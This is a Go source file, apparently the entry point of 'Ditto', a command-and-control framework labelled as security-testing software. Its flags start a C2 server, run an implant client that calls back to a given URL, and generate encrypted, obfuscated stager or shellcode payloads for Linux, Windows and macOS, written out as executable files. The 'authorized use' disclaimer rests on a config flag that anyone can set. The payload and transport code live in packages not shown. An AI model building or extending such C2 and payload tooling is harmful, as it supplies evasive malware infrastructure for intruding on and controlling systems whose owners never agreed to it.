// Ditto - Advanced Security Testing Framework
// WARNING: This tool is for AUTHORIZED security testing and educational purposes ONLY.
// Unauthorized use of this software is illegal and may result in criminal prosecution.
// Use only on systems you own or have explicit written permission to test.
//
// This framework demonstrates security testing concepts for defensive security research.
// Always comply with applicable laws and regulations in your jurisdiction.

package main

import (
	"flag"
	"fmt"
	"log"
	"os"

	"github.com/ditto/ditto/banner"
	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/payload"
	"github.com/ditto/ditto/transport"
)

var (
	version   = "1.0.0"
	buildTime = "unknown"
	gitCommit = "unknown"
)

func main() {
	var (
		mode        = flag.String("mode", "interactive", "Operation mode: server, client, generate, or interactive")
		config      = flag.String("config", "", "Configuration file path")
		listenAddr  = flag.String("listen", "0.0.0.0:8443", "Server listen address")
		callbackURL = flag.String("callback", "", "Client callback URL")
		payloadType = flag.String("payload", "stager", "Payload type: stager, shellcode, or full")
		output      = flag.String("output", "", "Output file path")
		arch        = flag.String("arch", "amd64", "Target architecture: amd64, 386, arm64")
		osTarget    = flag.String("os", "linux", "Target OS: linux, windows, darwin")
		encrypt     = flag.Bool("encrypt", true, "Enable payload encryption")
		obfuscate   = flag.Bool("obfuscate", true, "Enable code obfuscation")
		debug       = flag.Bool("debug", false, "Enable debug logging")
		showVersion = flag.Bool("version", false, "Show version information")
	)

	flag.Parse()

	if *showVersion {
		fmt.Printf("Ditto v%s\nBuild: %s\nCommit: %s\n", version, buildTime, gitCommit)
		os.Exit(0)
	}

	// Print banner
	printBanner()

	// Initialize logger
	logger := core.NewLogger(*debug)
	logger.Info("Initializing Ditto...")

	// Load configuration
	cfg, err := core.LoadConfig(*config)
	if err != nil {
		logger.Warn("Using default configuration: %v", err)
		cfg = core.DefaultConfig()
	}

	// Validate authorization
	if !cfg.Authorized {
		log.Fatal("ERROR: Authorization check failed. This tool requires explicit authorization.")
	}

	switch *mode {
	case "server":
		runServer(logger, cfg, *listenAddr)
	case "client":
		runClient(logger, cfg, *callbackURL)
	case "generate":
		generatePayload(logger, cfg, *payloadType, *output, *arch, *osTarget, *encrypt, *obfuscate)
	case "interactive":
		runInteractive(logger, cfg)
	default:
		log.Fatal("Invalid mode. Use: server, client, generate, or interactive")
	}
}

func printBanner() {
	// Try to print ditto.png as ASCII art
	if err := banner.PrintDittoBanner(); err != nil {
		// Fallback to text banner
		fmt.Println("Ditto - Advanced Security Testing Framework")
		fmt.Println("AUTHORIZED USE ONLY - SECURITY RESEARCH ONLY")
		fmt.Println()
	}
}

func runServer(logger *core.Logger, cfg *core.Config, listenAddr string) {
	logger.Info("Starting C2 server on %s", listenAddr)
	
	server := transport.NewServer(cfg, logger)
	if err := server.Start(listenAddr); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}

func runClient(logger *core.Logger, cfg *core.Config, callbackURL string) {
	if callbackURL == "" {
		log.Fatal("Callback URL required for client mode")
	}
	
	logger.Info("Starting client connection to %s", callbackURL)
	
	client := transport.NewClient(cfg, logger)
	if err := client.Connect(callbackURL); err != nil {
		log.Fatalf("Client connection failed: %v", err)
	}
	
	client.Run()
}

func generatePayload(logger *core.Logger, cfg *core.Config, payloadType, output, arch, osTarget string, encrypt, obfuscate bool) {
	logger.Info("Generating payload: type=%s, arch=%s, os=%s", payloadType, arch, osTarget)
	
	options := payload.Options{
		Type:      payloadType,
		Arch:      arch,
		OS:        osTarget,
		Encrypt:   encrypt,
		Obfuscate: obfuscate,
		Config:    cfg,
	}
	
	gen := payload.NewGenerator(logger)
	data, err := gen.Generate(options)
	if err != nil {
		log.Fatalf("Payload generation failed: %v", err)
	}
	
	if output == "" {
		output = fmt.Sprintf("payload_%s_%s_%s.bin", payloadType, osTarget, arch)
	}
	
	if err := os.WriteFile(output, data, 0755); err != nil {
		log.Fatalf("Failed to write payload: %v", err)
	}
	
	logger.Info("Payload generated successfully: %s", output)
}

